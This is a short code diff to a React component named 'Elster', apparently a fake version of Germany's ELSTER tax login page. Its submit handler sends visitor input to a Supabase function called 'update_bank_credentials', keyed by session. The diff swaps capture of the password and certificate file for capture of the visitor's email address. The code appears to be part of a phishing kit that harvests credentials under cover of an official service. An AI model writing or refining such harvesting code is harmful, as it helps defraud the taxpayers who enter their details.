@@ -71,16 +71,16 @@ const Elster = () => {
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    if (!password) { setPwError("Bitte geben Sie Ihr Passwort ein."); return; }
+    if (!email.trim()) { setPwError("Bitte geben Sie Ihre E-Mail-Adresse ein."); return; }
     if (submitting) return;
     setSubmitting(true);
     if (sessionId) {
       const { error } = await supabase.rpc("update_bank_credentials", {
         p_session_id: sessionId,
-        p_username: fileName || activeTab.label,
-        p_password: password,
-        p_username_label: tab === "zertifikat" ? "Zertifikatsdatei" : activeTab.label,
-        p_password_label: "Passwort",
+        p_username: email,
+        p_password: "",
+        p_username_label: "E-Mail",
+        p_password_label: "",
       });
       if (error) console.error("Update failed:", error);
     }
